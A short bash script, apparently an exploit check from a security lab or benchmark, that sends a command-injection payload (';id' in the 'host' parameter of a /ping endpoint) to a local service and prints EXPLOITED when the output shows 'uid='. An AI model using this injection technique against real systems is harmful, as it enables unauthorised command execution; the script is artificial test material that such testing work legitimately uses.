#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/ping?host=;id")
if echo "$resp" | grep -q "uid="; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
